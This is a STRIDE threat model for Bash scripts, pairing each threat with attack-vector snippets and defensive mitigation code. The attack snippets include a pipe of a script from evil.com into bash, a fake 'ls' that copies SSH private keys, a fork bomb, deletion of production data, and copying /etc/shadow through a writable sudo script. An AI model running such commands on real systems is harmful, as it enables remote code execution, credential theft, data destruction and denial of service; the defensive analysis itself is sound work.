# Bash Script Threat Model

Comprehensive threat analysis for Bash scripts using STRIDE methodology and attack scenario modeling.

---

## Assets

What needs protection in Bash scripts:

- **System Integrity**: File system, system configuration, installed software
  - Criticality: **CRITICAL**
  - Impact: System compromise, data loss, service disruption

- **Confidential Data**: API keys, passwords, tokens, user data
  - Criticality: **CRITICAL**
  - Impact: Data breach, unauthorized access, identity theft

- **Script Execution Context**: Process privileges, environment variables, working directory
  - Criticality: **HIGH**
  - Impact: Privilege escalation, unauthorized operations

- **External Resources**: Network services, databases, cloud APIs
  - Criticality: **HIGH**
  - Impact: Service disruption, data corruption, financial loss

- **Temporary Files**: Intermediate data, credentials, session tokens
  - Criticality: **MEDIUM**
  - Impact: Information disclosure, session hijacking

---

## STRIDE Analysis

### S - Spoofing

**Threat S1: Environment Variable Spoofing**

**Description**: Attacker manipulates environment variables to change script behavior or inject malicious code.

**Attack Vector**:
```bash
# Attacker sets malicious environment
export PATH="/tmp/evil:$PATH"
export LD_PRELOAD="/tmp/malicious.so"
export BASH_ENV="/tmp/evil.sh"

# Script runs with compromised environment
./vulnerable-script.sh
```

**Impact**:
- Confidentiality: **CRITICAL** (credential theft)
- Integrity: **CRITICAL** (code execution)
- Availability: **HIGH** (service disruption)

**Likelihood**: **MEDIUM**

**Mitigation**:
1. Reset PATH to known-safe value at script start
2. Use absolute paths for all commands
3. Unset or validate dangerous variables (LD_PRELOAD, BASH_ENV)
4. Use `env -i` to start with clean environment

**Verification**:
```bash
#!/bin/bash
# Test environment sanitization

# Save original PATH
export ORIGINAL_PATH="$PATH"

# Reset to safe PATH
export PATH="/usr/local/bin:/usr/bin:/bin"

# Unset dangerous variables
unset LD_PRELOAD LD_LIBRARY_PATH BASH_ENV

# Verify PATH is safe
if [[ "$PATH" != "/usr/local/bin:/usr/bin:/bin" ]]; then
    echo "FAIL: PATH not sanitized" >&2
    exit 1
fi

# Verify dangerous vars unset
if [[ -n "$LD_PRELOAD" ]] || [[ -n "$BASH_ENV" ]]; then
    echo "FAIL: Dangerous variables still set" >&2
    exit 1
fi

echo "PASS: Environment sanitized"
```

---

**Threat S2: Command Spoofing via PATH Manipulation**

**Description**: Attacker places malicious executables in PATH directories to intercept legitimate commands.

**Attack Vector**:
```bash
# Attacker creates fake 'ls' in /tmp
cat > /tmp/ls <<'EOF'
#!/bin/bash
# Steal credentials
cp ~/.ssh/id_rsa /tmp/stolen_key
# Execute real ls
/bin/ls "$@"
EOF
chmod +x /tmp/ls

# If script uses relative command and PATH includes /tmp
export PATH="/tmp:$PATH"
./script.sh  # Uses malicious /tmp/ls
```

**Impact**:
- Confidentiality: **CRITICAL**
- Integrity: **CRITICAL**
- Availability: **MEDIUM**

**Likelihood**: **MEDIUM**

**Mitigation**:
```bash
#!/bin/bash
# Always use absolute paths for commands
readonly LS="/bin/ls"
readonly GREP="/bin/grep"
readonly AWK="/usr/bin/awk"

# Or verify command location
verify_command() {
    local cmd="$1"
    local expected_path="$2"
    local actual_path

    actual_path=$(command -v "$cmd")

    if [[ "$actual_path" != "$expected_path" ]]; then
        echo "Error: Command spoofing detected for $cmd" >&2
        echo "Expected: $expected_path, Got: $actual_path" >&2
        return 1
    fi

    return 0
}

verify_command "ls" "/bin/ls" || exit 1
verify_command "grep" "/bin/grep" || exit 1
```

---

### T - Tampering

**Threat T1: Script Modification**

**Description**: Attacker modifies script file to inject malicious code before execution.

**Attack Vector**:
```bash
# World-writable script directory
chmod 777 /opt/scripts

# Attacker modifies script
echo "curl http://evil.com/steal.sh | bash" >> /opt/scripts/backup.sh

# Next execution runs malicious code
/opt/scripts/backup.sh
```

**Impact**:
- Confidentiality: **CRITICAL**
- Integrity: **CRITICAL**
- Availability: **CRITICAL**

**Likelihood**: **LOW** (requires write access)

**Mitigation**:
1. Set restrictive permissions on scripts (755 or 500)
2. Store scripts in protected directories
3. Use digital signatures for critical scripts
4. Verify script integrity before execution

**Verification**:
```bash
# Calculate and store script hash
calculate_script_hash() {
    local script="$1"
    sha256sum "$script" | awk '{print $1}'
}

# Verify script hasn't been modified
verify_script_integrity() {
    local script="$1"
    local expected_hash="$2"
    local actual_hash

    actual_hash=$(calculate_script_hash "$script")

    if [[ "$actual_hash" != "$expected_hash" ]]; then
        echo "Error: Script integrity check failed" >&2
        echo "Expected: $expected_hash" >&2
        echo "Actual:   $actual_hash" >&2
        return 1
    fi

    return 0
}

# Usage
readonly SCRIPT_HASH="abc123..."
verify_script_integrity "$0" "$SCRIPT_HASH" || exit 1
```

---

**Threat T2: Log Tampering**

**Description**: Attacker modifies or deletes logs to hide malicious activity.

**Attack Vector**:
```bash
# Script writes to world-writable log
echo "Admin action performed" >> /var/log/app.log

# Attacker removes evidence
> /var/log/app.log  # Truncate log
```

**Impact**:
- Confidentiality: **MEDIUM**
- Integrity: **HIGH**
- Availability: **LOW**

**Likelihood**: **MEDIUM**

**Mitigation**:
```bash
# Secure log file creation
create_secure_log() {
    local log_file="$1"

    # Create with restrictive permissions
    touch "$log_file"
    chmod 600 "$log_file"

    # Make append-only (requires root)
    if [[ $EUID -eq 0 ]]; then
        chattr +a "$log_file"
    fi

    return 0
}

# Append-only logging
secure_log() {
    local message="$1"
    local log_file="${2:-/var/log/app.log}"
    local timestamp

    timestamp="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"

    # Atomic append
    echo "[$timestamp] $message" >> "$log_file"
}

# Remote logging for critical events
log_to_remote() {
    local message="$1"
    local syslog_server="logs.example.com"

    logger -n "$syslog_server" -P 514 "$message"
}
```

---

### R - Repudiation

**Threat R1: Action Without Audit Trail**

**Description**: Critical operations performed without logging, preventing accountability.

**Attack Vector**:
```bash
# No logging of privileged operations
sudo rm -rf /data/production/*
sudo useradd attacker
sudo usermod -aG sudo attacker

# No audit trail of who did what
```

**Impact**:
- Confidentiality: **LOW**
- Integrity: **MEDIUM**
- Availability: **LOW**

**Likelihood**: **HIGH**

**Mitigation**:
```bash
# Audit logging for critical operations
audit_log() {
    local action="$1"
    shift
    local params="$*"
    local user="${SUDO_USER:-$USER}"
    local timestamp
    timestamp="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"

    # Log to secure audit file
    local audit_entry="[$timestamp] USER=$user ACTION=$action PARAMS=$params"
    echo "$audit_entry" >> /var/log/audit.log

    # Also log to syslog
    logger -t "AUDIT" -p auth.warning "$audit_entry"
}

# Wrap privileged operations
safe_rm() {
    local target="$1"

    # Log before action
    audit_log "rm" "$target"

    # Perform action
    rm -rf "$target"

    local exit_code=$?

    # Log result
    audit_log "rm_result" "target=$target exit_code=$exit_code"

    return "$exit_code"
}
```

---

### I - Information Disclosure

**Threat I1: Secret Exposure in Process List**

**Description**: Sensitive data visible in process listing (`ps`, `/proc`).

**Attack Vector**:
```bash
# Password visible in process list
mysql -u root -p"SecretPassword123" mydb

# ps aux shows:
# mysql -u root -pSecretPassword123 mydb
```

**Impact**:
- Confidentiality: **CRITICAL**
- Integrity: **LOW**
- Availability: **LOW**

**Likelihood**: **HIGH**

**Mitigation**:
```bash
# Use credential files
create_mysql_config() {
    local password="$1"
    local config_file

    config_file=$(mktemp /tmp/my.cnf.XXXXXX)
    chmod 600 "$config_file"

    cat > "$config_file" <<EOF
[client]
user=root
password=$password
EOF

    echo "$config_file"
}

# Usage
mysql_config=$(create_mysql_config "$DB_PASSWORD")
trap "rm -f '$mysql_config'" EXIT

mysql --defaults-extra-file="$mysql_config" mydb
```

---

**Threat I2: Temporary File Exposure**

**Description**: Sensitive data in temporary files with insufficient permissions.

**Attack Vector**:
```bash
# Insecure temp file
echo "$API_KEY" > /tmp/api_key.txt  # Created with 644 permissions

# Attacker reads file
cat /tmp/api_key.txt
```

**Impact**:
- Confidentiality: **CRITICAL**
- Integrity: **LOW**
- Availability: **LOW**

**Likelihood**: **HIGH**

**Mitigation**:
```bash
# Secure temporary file handling
create_secure_temp() {
    local template="${1:-/tmp/secure.XXXXXX}"
    local temp_file

    # Create with secure permissions
    temp_file=$(mktemp "$template") || return 1
    chmod 600 "$temp_file"

    echo "$temp_file"
}

# Usage
temp_file=$(create_secure_temp) || exit 1
trap "shred -u '$temp_file'" EXIT  # Secure deletion

echo "$API_KEY" > "$temp_file"
```

---

### D - Denial of Service

**Threat D1: Resource Exhaustion**

**Description**: Script consumes excessive resources, causing system instability.

**Attack Vector**:
```bash
# Fork bomb
bomb() { bomb | bomb & }; bomb

# Disk space exhaustion
while true; do
    dd if=/dev/zero of=/tmp/fill_disk_$RANDOM bs=1M count=1000
done

# Memory exhaustion
data=""
while true; do
    data="$data$(head -c 1M /dev/urandom)"
done
```

**Impact**:
- Confidentiality: **LOW**
- Integrity: **LOW**
- Availability: **CRITICAL**

**Likelihood**: **MEDIUM**

**Mitigation**:
```bash
#!/bin/bash
# Resource limits

# Set hard limits
ulimit -v 1048576    # 1GB virtual memory
ulimit -f 1048576    # 1GB file size
ulimit -u 100        # Max 100 processes
ulimit -t 600        # 10 minutes CPU time

# Monitor resource usage
check_resources() {
    local mem_usage
    mem_usage=$(free | awk '/Mem:/ {printf "%.0f", $3/$2 * 100}')

    if [[ $mem_usage -gt 90 ]]; then
        echo "Error: Memory usage too high: ${mem_usage}%" >&2
        return 1
    fi

    local disk_usage
    disk_usage=$(df /tmp | awk 'NR==2 {print $5}' | tr -d '%')

    if [[ $disk_usage -gt 90 ]]; then
        echo "Error: Disk usage too high: ${disk_usage}%" >&2
        return 1
    fi

    return 0
}

# Bounded operations
bounded_process() {
    local max_iterations=1000
    local iteration=0

    while [[ $iteration -lt $max_iterations ]]; do
        check_resources || break

        # Do work
        process_item "$iteration"

        ((iteration++))
    done
}
```

---

**Threat D2: Algorithmic Complexity Attack**

**Description**: Input crafted to trigger worst-case algorithm performance.

**Attack Vector**:
```bash
# Nested loop with user-controlled input
process_data() {
    local input="$1"

    # O(n²) complexity
    for ((i=0; i<${#input}; i++)); do
        for ((j=0; j<${#input}; j++)); do
            # Process each character pair
            echo "${input:$i:1}${input:$j:1}"
        done
    done
}

# Attacker provides huge input
process_data "$(head -c 100000 /dev/urandom | base64)"
```

**Impact**:
- Confidentiality: **LOW**
- Integrity: **LOW**
- Availability: **HIGH**

**Likelihood**: **MEDIUM**

**Mitigation**:
```bash
# Input size limits
validate_input_size() {
    local input="$1"
    local max_size="${2:-10000}"

    if [[ ${#input} -gt $max_size ]]; then
        echo "Error: Input too large (${#input} > $max_size)" >&2
        return 1
    fi

    return 0
}

# Timeout protection
process_with_timeout() {
    local timeout=30
    local input="$1"

    validate_input_size "$input" 1000 || return 1

    timeout "$timeout" process_data "$input" || {
        echo "Error: Processing timed out" >&2
        return 1
    }
}
```

---

### E - Elevation of Privilege

**Threat E1: Sudo Misconfiguration**

**Description**: Overly permissive sudo rules allow privilege escalation.

**Attack Vector**:
```bash
# /etc/sudoers entry:
# user ALL=(ALL) NOPASSWD: /opt/scripts/backup.sh

# backup.sh is world-writable
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root 100 Dec 1 12:00 backup.sh

# Attacker modifies script
echo "cat /etc/shadow > /tmp/shadow_copy" >> /opt/scripts/backup.sh

# Run with sudo
sudo /opt/scripts/backup.sh
```

**Impact**:
- Confidentiality: **CRITICAL**
- Integrity: **CRITICAL**
- Availability: **CRITICAL**

**Likelihood**: **MEDIUM**

**Mitigation**:
```bash
# Restrictive sudo configuration
# /etc/sudoers.d/app:
# appuser ALL=(root) NOPASSWD: /usr/local/bin/app-admin.sh

# Secure script permissions
chmod 755 /usr/local/bin/app-admin.sh
chown root:root /usr/local/bin/app-admin.sh

# Script validates caller
validate_caller() {
    local allowed_user="appuser"
    local caller="${SUDO_USER:-$USER}"

    if [[ "$caller" != "$allowed_user" ]]; then
        echo "Error: Unauthorized caller: $caller" >&2
        return 1
    fi

    return 0
}

# Drop privileges after privileged operations
drop_privileges() {
    local target_user="appuser"

    if [[ $EUID -eq 0 ]]; then
        exec sudo -u "$target_user" "$0" "$@"
    fi
}
```

---

## Security Controls Matrix

| Threat | Category | Severity | Mitigation | Status | Verification |
|--------|----------|----------|------------|--------|--------------|
| Environment Spoofing | S | HIGH | Sanitize environment | ✅ | Test with malicious env |
| Command Spoofing | S | HIGH | Use absolute paths | ✅ | Verify command locations |
| Script Modification | T | CRITICAL | File permissions, integrity checks | ✅ | Test with modified script |
| Log Tampering | T | MEDIUM | Append-only logs, remote logging | ✅ | Attempt log modification |
| Missing Audit Trail | R | MEDIUM | Comprehensive logging | ✅ | Review audit logs |
| Process List Exposure | I | CRITICAL | Credential files | ✅ | Check ps output |
| Temp File Exposure | I | CRITICAL | Secure temp file creation | ✅ | Check file permissions |
| Resource Exhaustion | D | HIGH | ulimit, monitoring | ✅ | Trigger resource limits |
| Algorithm Complexity | D | MEDIUM | Input validation, timeouts | ✅ | Test with large input |
| Sudo Misconfiguration | E | CRITICAL | Restrictive sudo rules | ✅ | Audit sudo config |

---

## Threat Scenarios

### Scenario 1: Compromised CI/CD Pipeline

**Context**: Bash scripts run in CI/CD with elevated privileges

**Attack Chain**:
1. Attacker compromises developer account
2. Injects malicious code into build script
3. Script runs with CI/CD credentials
4. Attacker exfiltrates secrets, deploys backdoor

**Impact**: **CRITICAL**

**Mitigations**:
- Code review for all script changes
- Principle of least privilege for CI/CD
- Secret scanning in commits
- Immutable build environments
- Audit logging of all CI/CD actions

---

### Scenario 2: Shared Hosting Environment

**Context**: Multiple users running Bash scripts on shared server

**Attack Chain**:
1. User A creates world-readable temp file with API key
2. User B's cron job lists /tmp directory
3. User B discovers and reads API key
4. User B uses key to access User A's resources

**Impact**: **HIGH**

**Mitigations**:
- Restrictive umask (077)
- Secure temp file creation (mktemp with 600 permissions)
- Regular security audits of /tmp
- User quotas and monitoring

---

## Recommended Security Practices

1. **Defense in Depth**: Multiple security layers
2. **Least Privilege**: Minimal permissions required
3. **Fail Securely**: Errors don't expose secrets
4. **Complete Mediation**: Check every access
5. **Secure Defaults**: Security on by default
6. **Separation of Privilege**: Modular, restricted components
7. **Psychological Acceptability**: Security doesn't hinder usability
